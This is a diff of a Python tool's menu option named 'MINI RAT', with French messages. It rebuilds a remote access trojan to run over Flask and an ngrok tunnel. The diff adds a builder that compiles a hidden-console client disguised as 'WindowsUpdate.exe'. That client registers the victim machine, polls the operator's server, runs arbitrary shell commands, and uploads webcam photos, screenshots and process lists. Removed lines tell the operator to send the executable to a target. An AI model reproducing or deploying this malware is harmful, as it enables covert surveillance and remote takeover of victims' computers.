@@ -31,6 +31,9 @@ import threading
 from pyngrok import ngrok
 from flask import Flask, send_file
 import PyInstaller.__main__
+from pyngrok import ngrok, conf
+from flask import Flask, request, jsonify, send_file
+import threading
 
 
 
@@ -1067,6 +1070,8 @@ if menu_choice == "6":
     print_violet_white_gradient(mini)
     app = Flask(__name__)
     received_files = {}
+    command_queue = {}  
+    results_queue = {}  
 
     @app.route('/view/<filename>')
     def view_file(filename):
@@ -1074,265 +1079,495 @@ if menu_choice == "6":
             return send_file(received_files[filename], mimetype='image/jpeg')
         return "File not found", 404
 
-    def start_flask(port):
-        app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
+    @app.route('/register', methods=['POST'])
+    def register_client():
+        data = request.json
+        client_id = data.get('client_id')
+        client_info = data.get('info', 'Unknown')
+        
+        if client_id not in command_queue:
+            command_queue[client_id] = {"command": None, "executed": False}
+            results_queue[client_id] = {"result": None, "retrieved": True}
+            print(f"\n{'='*60}")
+            print(f" NOUVEAU CLIENT CONNECTÉ: {client_id}")
+            print(f" Info: {client_info}")
+            print(f"{'='*60}\n")
+        
+        return jsonify({"status": "registered"})
 
-    def handle_client(client_socket, client_address, flask_url):
-        print(f"\nNew connection from: {client_address}")
+    @app.route('/get_command', methods=['POST'])
+    def get_command():
+        data = request.json
+        client_id = data.get('client_id')
+        
+        if client_id in command_queue:
+            cmd_data = command_queue[client_id]
+            if cmd_data["command"] and not cmd_data["executed"]:
+                cmd_data["executed"] = True
+                return jsonify({"command": cmd_data["command"]})
+        
+        return jsonify({"command": None})
+
+    @app.route('/send_result', methods=['POST'])
+    def send_result():
+        data = request.json
+        client_id = data.get('client_id')
+        result = data.get('result', '')
+        result_type = data.get('type', 'text')
+        
+        if client_id in results_queue:
+            if result_type == 'file':
+                file_data = base64.b64decode(result)
+                filename = f"{client_id}_{int(time.time())}.jpg"
+                filepath = os.path.join(os.getcwd(), filename)
+                
+                with open(filepath, 'wb') as f:
+                    f.write(file_data)
+                
+                received_files[filename] = filepath
+                results_queue[client_id] = {
+                    "result": f"Fichier reçu: {filename}",
+                    "retrieved": False,
+                    "file": filename
+                }
+            else:
+                results_queue[client_id] = {
+                    "result": result,
+                    "retrieved": False
+                }
+        
+        return jsonify({"status": "received"})
+
+    def start_flask(port):
+        import logging
+        log = logging.getLogger('werkzeug')
+        log.setLevel(logging.ERROR)
+        app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False, threaded=True)
+
+    def command_interface(flask_url):
+        active_clients = []
+        current_client = None
+        
+        print("\n" + "="*60)
+        print("INTERFACE DE COMMANDE")
+        print("="*60)
+        print("Tapez 'clients' pour voir les clients connectés")
+        print("Tapez 'select <id>' pour sélectionner un client")
+        print("Tapez 'help' pour voir les commandes disponibles")
+        print("="*60 + "\n")
         
         while True:
             try:
-                command = input(f"\n[{client_address}] Enter command: ").strip()
                 
-                if command.lower() == 'exit':
-                    client_socket.send(b'exit')
-                    client_socket.close()
-                    print(f"Connection closed with {client_address}")
-                    break
+                active_clients = [cid for cid in command_queue.keys()]
                 
-                if not command:
+                if current_client:
+                    prompt = f"[{current_client}] $ "
+                else:
+                    prompt = "RAT $ "
+                
+                user_input = input(prompt).strip()
+                
+                if not user_input:
                     continue
                 
-                client_socket.send(command.encode('utf-8'))
+                if user_input.lower() == 'clients':
+                    if active_clients:
+                        print("\n Clients connectés:")
+                        for i, cid in enumerate(active_clients, 1):
+                            marker = "" if cid == current_client else "  "
+                            print(f"{marker} {i}. {cid}")
+                    else:
+                        print(" Aucun client connecté")
+                    continue
                 
-                if command.startswith('webcam') or command.startswith('screen'):
-                    data_size = int(client_socket.recv(1024).decode('utf-8'))
-                    received_data = b''
-                    
-                    while len(received_data) < data_size:
-                        chunk = client_socket.recv(4096)
-                        if not chunk:
-                            break
-                        received_data += chunk
-                    
-                    filename = f"{command}_{int(time.time())}.jpg"
-                    filepath = os.path.join(os.getcwd(), filename)
-                    
-                    with open(filepath, 'wb') as f:
-                        f.write(received_data)
-                    
-                    received_files[filename] = filepath
-                    print(f"\nFile received: {filename}")
-                    print(f"View at: {flask_url}/view/{filename}")
+                if user_input.lower().startswith('select '):
+                    client_id = user_input[7:].strip()
+                    if client_id in active_clients:
+                        current_client = client_id
+                        print(f"✅ Client sélectionné: {current_client}")
+                    else:
+                        print(f" Client '{client_id}' non trouvé")
+                    continue
+                
+                if user_input.lower() == 'help':
+                    print("\n💻 Commandes disponibles:")
+                    print("   • clients         : Liste des clients")
+                    print("   • select <id>     : Sélectionner un client")
+                    print("   • cmd <commande>  : Exécuter une commande shell")
+                    print("   • sysinfo         : Informations système")
+                    print("   • processes       : Liste des processus")
+                    print("   • webcam          : Prendre une photo webcam")
+                    print("   • screen          : Prendre un screenshot")
+                    print("   • disconnect      : Déconnecter le client actuel")
+                    print("   • help            : Afficher cette aide")
+                    continue
+                
+                if user_input.lower() == 'disconnect':
+                    if current_client:
+                        command_queue[current_client]["command"] = "exit"
+                        command_queue[current_client]["executed"] = False
+                        print(f" Déconnexion de {current_client}")
+                        current_client = None
+                    continue
+                
+                if not current_client:
+                    print(" Sélectionne d'abord un client avec 'select <id>'")
+                    continue
+                
+                
+                command_queue[current_client]["command"] = user_input
+                command_queue[current_client]["executed"] = False
+                results_queue[current_client]["retrieved"] = True
+                
+                print(" Commande envoyée, en attente du résultat...")
+                
+                
+                timeout = 30
+                start_time = time.time()
+                while time.time() - start_time < timeout:
+                    if not results_queue[current_client]["retrieved"]:
+                        result = results_queue[current_client]["result"]
+                        results_queue[current_client]["retrieved"] = True
+                        
+                        if "file" in results_queue[current_client]:
+                            filename = results_queue[current_client]["file"]
+                            print(f"\n{result}")
+                            print(f" Voir à: {flask_url}/view/{filename}\n")
+                        else:
+                            print(f"\n Résultat:\n{result}\n")
+                        break
+                    time.sleep(0.5)
                 else:
-                    response = client_socket.recv(16384).decode('utf-8', errors='ignore')
-                    print(f"\nOutput:\n{response}")
+                    print("  Timeout - pas de réponse du client")
                 
-            except Exception as e:
-                print(f"Error: {e}")
-                client_socket.close()
+            except KeyboardInterrupt:
+                print("\n\n  Arrêt...")
                 break
+            except Exception as e:
+                print(f" Erreur: {e}")
 
-    def start_server(port, flask_url):
-        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        server.bind(('0.0.0.0', port))
-        server.listen(5)
+    def install_dependencies():
+        print("\n Vérification des dépendances...")
         
-        print(f"Server listening on port {port}...")
+        dependencies = ['pyngrok', 'flask', 'pyinstaller', 'requests']
         
-        while True:
-            client_socket, client_address = server.accept()
-            client_handler = threading.Thread(target=handle_client, args=(client_socket, client_address, flask_url))
-            client_handler.start()
+        for dep in dependencies:
+            try:
+                __import__(dep)
+                print(f"✅ {dep} déjà installé")
+            except ImportError:
+                print(f"✅ Installation de {dep}...")
+                subprocess.check_call([sys.executable, "-m", "pip", "install", dep, "-q"])
+                print(f"✅ {dep} installé avec succès")
 
-    def create_client_script(server_url, port):
-        client_code = f'''import socket
+    def create_client_file(server_url):        
+        client_code = f'''import requests
 import subprocess
 import os
 import time
 import sys
+import base64
+import platform
+import uuid
+
+SERVER_URL = "{server_url}"
+CLIENT_ID = f"{{platform.node()}}_{{str(uuid.uuid4())[:8]}}"
 
 def take_webcam_photo():
     try:
         import cv2
         cap = cv2.VideoCapture(0)
+        if not cap.isOpened():
+            return None
         ret, frame = cap.read()
         if ret:
-            filename = "webcam.jpg"
+            filename = "temp_webcam.jpg"
             cv2.imwrite(filename, frame)
             cap.release()
             return filename
+        cap.release()
     except:
-        return None
+        pass
+    return None
 
 def take_screenshot():
     try:
         from PIL import ImageGrab
         screenshot = ImageGrab.grab()
-        filename = "screen.jpg"
-        screenshot.save(filename)
+        filename = "temp_screen.jpg"
+        screenshot.save(filename, 'JPEG')
         return filename
     except:
-        return None
+        pass
+    return None
 
 def get_system_info():
-    import platform
-    info = f"System: {{platform.system()}}\\n"
-    info += f"Node: {{platform.node()}}\\n"
-    info += f"Release: {{platform.release()}}\\n"
-    info += f"Version: {{platform.version()}}\\n"
-    info += f"Machine: {{platform.machine()}}\\n"
-    info += f"Processor: {{platform.processor()}}"
-    return info
+    try:
+        info = f"System: {{platform.system()}}\\n"
+        info += f"Node: {{platform.node()}}\\n"
+        info += f"Release: {{platform.release()}}\\n"
+        info += f"Version: {{platform.version()}}\\n"
+        info += f"Machine: {{platform.machine()}}\\n"
+        info += f"Processor: {{platform.processor()}}"
+        return info
+    except:
+        return "Unable to get system info"
 
 def list_processes():
     try:
         if os.name == 'nt':
             output = subprocess.check_output("tasklist", shell=True)
+            return output.decode('cp1252', errors='ignore')
         else:
             output = subprocess.check_output("ps aux", shell=True)
-        return output.decode('cp1252', errors='ignore')
+            return output.decode('utf-8', errors='ignore')
     except:
         return "Failed to list processes"
 
-def connect_to_server():
+def register():
+    try:
+        info = get_system_info()
+        response = requests.post(
+            f"{{SERVER_URL}}/register",
+            json={{"client_id": CLIENT_ID, "info": info}},
+            timeout=10
+        )
+        return response.status_code == 200
+    except:
+        return False
+
+def get_command():
+    try:
+        response = requests.post(
+            f"{{SERVER_URL}}/get_command",
+            json={{"client_id": CLIENT_ID}},
+            timeout=10
+        )
+        data = response.json()
+        return data.get("command")
+    except:
+        return None
+
+def send_result(result, result_type="text"):
+    try:
+        requests.post(
+            f"{{SERVER_URL}}/send_result",
+            json={{
+                "client_id": CLIENT_ID,
+                "result": result,
+                "type": result_type
+            }},
+            timeout=30
+        )
+    except:
+        pass
+
+def execute_command(command):
+    if command == "exit":
+        return None
+    
+    if command == "webcam":
+        filename = take_webcam_photo()
+        if filename and os.path.exists(filename):
+            with open(filename, 'rb') as f:
+                data = f.read()
+            encoded = base64.b64encode(data).decode('utf-8')
+            send_result(encoded, "file")
+            os.remove(filename)
+        else:
+            send_result("Error: Unable to capture webcam")
+    
+    elif command == "screen":
+        filename = take_screenshot()
+        if filename and os.path.exists(filename):
+            with open(filename, 'rb') as f:
+                data = f.read()
+            encoded = base64.b64encode(data).decode('utf-8')
+            send_result(encoded, "file")
+            os.remove(filename)
+        else:
+            send_result("Error: Unable to capture screen")
+    
+    elif command.startswith("cmd "):
+        cmd = command[4:]
+        try:
+            if sys.platform == 'win32':
+                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
+                output = output.decode('cp1252', errors='ignore')
+            else:
+                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
+                output = output.decode('utf-8', errors='ignore')
+            send_result(output)
+        except Exception as e:
+            send_result(f"Error: {{str(e)}}")
+    
+    elif command == "sysinfo":
+        info = get_system_info()
+        send_result(info)
+    
+    elif command == "processes":
+        processes = list_processes()
+        send_result(processes)
+    
+    else:
+        send_result("Unknown command")
+
+def main():
+    # S'enregistrer auprès du serveur
+    while not register():
+        time.sleep(5)
+    
+    # Boucle principale
     while True:
         try:
-            server = "{server_url}".replace("tcp://", "").replace("http://", "").replace("https://", "")
-            port = {port}
+            command = get_command()
             
-            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            client.connect((server, port))
-            
-            while True:
-                command = client.recv(4096).decode('utf-8')
-                
-                if command.lower() == 'exit':
+            if command:
+                if command == "exit":
                     break
-                
-                if command == 'webcam':
-                    filename = take_webcam_photo()
-                    if filename and os.path.exists(filename):
-                        with open(filename, 'rb') as f:
-                            data = f.read()
-                        client.send(str(len(data)).encode('utf-8'))
-                        time.sleep(0.1)
-                        client.sendall(data)
-                        os.remove(filename)
-                    else:
-                        client.send(b'0')
-                
-                elif command == 'screen':
-                    filename = take_screenshot()
-                    if filename and os.path.exists(filename):
-                        with open(filename, 'rb') as f:
-                            data = f.read()
-                        client.send(str(len(data)).encode('utf-8'))
-                        time.sleep(0.1)
-                        client.sendall(data)
-                        os.remove(filename)
-                    else:
-                        client.send(b'0')
-                
-                elif command.startswith('cmd '):
-                    cmd = command[4:]
-                    try:
-                        if sys.platform == 'win32':
-                            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
-                            output = output.decode('cp1252', errors='ignore')
-                        else:
-                            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
-                            output = output.decode('utf-8', errors='ignore')
-                        client.send(output.encode('utf-8'))
-                    except Exception as e:
-                        client.send(str(e).encode('utf-8'))
-                
-                elif command == 'sysinfo':
-                    info = get_system_info()
-                    client.send(info.encode('utf-8'))
-                
-                elif command == 'processes':
-                    processes = list_processes()
-                    client.send(processes.encode('utf-8'))
-                
-                else:
-                    client.send(b'Unknown command')
+                execute_command(command)
             
-            client.close()
-            break
+            time.sleep(2)
             
         except Exception as e:
             time.sleep(5)
 
 if __name__ == "__main__":
-    connect_to_server()
+    # Masquer la console sur Windows
+    if sys.platform == 'win32':
+        try:
+            import ctypes
+            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+        except:
+            pass
+    
+    main()
     '''
+        
         
         with open("client.py", "w", encoding='utf-8') as f:
             f.write(client_code)
-        
-        print(f"\nClient script created: client.py")
-        print("Compiling to executable...")
-        
+        print(f"\n{'='*60}")
+        print("✅ FICHIER CLIENT CRÉÉ: client.py")
+        print(f"{'='*60}")
+        print("\n🔨 Génération de l'exécutable...")
         try:
-            PyInstaller.__main__.run([
-                'client.py',
-                '--onefile',
-                '--noconsole',
-                '--name=SystemUpdate',
-                '--icon=NONE'
-            ])
-            print("\nExecutable created: dist/SystemUpdate.exe")
+            result = subprocess.run([
+                "pyinstaller",
+                "--onefile",
+                "--noconsole",
+                "--name=WindowsUpdate",
+                "client.py"
+            ], capture_output=True, text=True)
+            
+            exe_path = os.path.join("dist", "WindowsUpdate.exe")
+            if os.path.exists(exe_path):
+                print(f"✅ EXE créé avec succès: {exe_path}")
+                print(f"\n{'='*60}")
+                print(f" Serveur: {server_url}")
+                print(f" Fichier à distribuer: dist/WindowsUpdate.exe")
+                print(f"{'='*60}\n")
+            else:
+                print(" EXE non trouvé dans dist/")
         except Exception as e:
-            print(f"Error creating executable: {e}")
+            print(f" Erreur lors de la création de l'EXE: {e}")
+
+    def setup_ngrok(ngrok_token):
+        try:
+            from pyngrok import ngrok
+            from pyngrok.installer import install_ngrok
+            from pyngrok.conf import PyngrokConfig
+            import logging
+
+            logging.getLogger('pyngrok').setLevel(logging.ERROR)
+            
+            print(" Configuration de ngrok...")
+            
+            pyngrok_config = PyngrokConfig()
+            ngrok_path = install_ngrok(pyngrok_config.ngrok_path)
+            print(f"✅ Ngrok installé: {ngrok_path}")
+            
+            pyngrok_config = PyngrokConfig(ngrok_path=ngrok_path, log_event_callback=lambda log: None)
+            ngrok.set_auth_token(ngrok_token, pyngrok_config)
+            print("✅ Token ngrok configuré")
+            
+            return pyngrok_config
+            
+        except Exception as e:
+            print(f" Erreur configuration ngrok: {e}")
+            return None
 
     def main():
-        print("Remote Access Tool\n")
+        print("\n" + "="*60)
+        print("      MINI RAT ^^     ")
+        print("="*60 + "\n")
+
+        import logging
+        logging.getLogger('pyngrok').setLevel(logging.CRITICAL)
+        logging.getLogger('werkzeug').setLevel(logging.ERROR)
+
+        install_dependencies()
         
-        ngrok_token = input("Enter your ngrok auth token: ").strip()
-        ngrok.set_auth_token(ngrok_token)
+        from pyngrok import ngrok
+
+        ngrok_token = input("\n Token ngrok : ").strip()
+        if not ngrok_token:
+            print("Token ngrok requis!")
+            return
         
-        port = int(input("Enter port for server (default 4444): ") or "4444")
-        flask_port = int(input("Enter port for Flask (default 5000): ") or "5000")
-        flask_thread = threading.Thread(target=start_flask, args=(flask_port,))
+        pyngrok_config = setup_ngrok(ngrok_token)
+        if not pyngrok_config:
+            return
+
+        port = int(input("Port Flask [5000]: ") or "5000")
+
+        print("\n Démarrage de Flask...")
+        flask_thread = threading.Thread(target=start_flask, args=(port,))
         flask_thread.daemon = True
         flask_thread.start()
         time.sleep(2)
-        
-        print("Starting ngrok tunnels...")
-        tunnel_tcp = ngrok.connect(port, "tcp")
-        tunnel_http = ngrok.connect(flask_port, "http")
-        
-        public_url_tcp = tunnel_tcp.public_url
-        public_url_http = tunnel_http.public_url
-        
-        print(f"\nTCP tunnel: {public_url_tcp}")
-        print(f"HTTP tunnel: {public_url_http}")
-        
-        server_host = public_url_tcp.replace("tcp://", "").split(":")[0]
-        server_port = int(public_url_tcp.replace("tcp://", "").split(":")[1])
-        
-        create_client_script(server_host, server_port)
-        
-        print("\nAvailable commands:")
-        print("  webcam - Take webcam photo")
-        print("  screen - Take screenshot")
-        print("  cmd <command> - Execute command")
-        print("  sysinfo - Get system information")
-        print("  processes - List running processes")
-        print("  exit - Disconnect client")
-        
-        print("\nInstructions:")
-        print("1. Send 'dist/SystemUpdate.exe' to target")
-        print("2. Have them run the executable")
-        print("3. Wait for connection...")
-        
-        server_thread = threading.Thread(target=start_server, args=(port, public_url_http))
-        server_thread.daemon = True
-        server_thread.start()
-        
+
+        print(" Création du tunnel HTTP ngrok (GRATUIT)...")
         try:
-            while True:
-                time.sleep(1)
-        except KeyboardInterrupt:
-            print("\n\nShutting down...")
-            input("\nPress enter to continue...")
-            time.sleep(1)
-            os.system("python Alt-tool-Free.py")
+            tunnel = ngrok.connect(port, "http", pyngrok_config=pyngrok_config)
+            public_url = tunnel.public_url
+
+            print("\n" + "="*60)
+            print("✅ TUNNEL HTTP NGROK CRÉÉ!")
+            print("="*60)
+            print(f" URL publique: {public_url}")
+            print("="*60 + "\n")
+
+            create_client_file(public_url)
+
+            print("\n✅ Serveur prêt! Les clients vont se connecter automatiquement...")
+            print(f" URL du serveur: {public_url}")
+            print(f" Fichier à distribuer: dist/WindowsUpdate.exe")
+            print(" Appuie sur Ctrl+C pour arrêter\n")
+            
+            time.sleep(2)
+            
+          
+            command_interface(public_url)
+
+        except Exception as e:
+            print(f" Erreur ngrok: {e}")
+            import traceback
+            traceback.print_exc()
+            return
 
     if __name__ == "__main__":
-        main()
-
+        try:
+            main()
+        except KeyboardInterrupt:
+            print("\n\n  Arrêt du serveur...")
+            sys.exit(0)
+        except Exception as e:
+            print(f"\n Erreur: {e}")
+            import traceback
+            traceback.print_exc()
+            sys.exit(1)
 
 
 if menu_choice == "7":
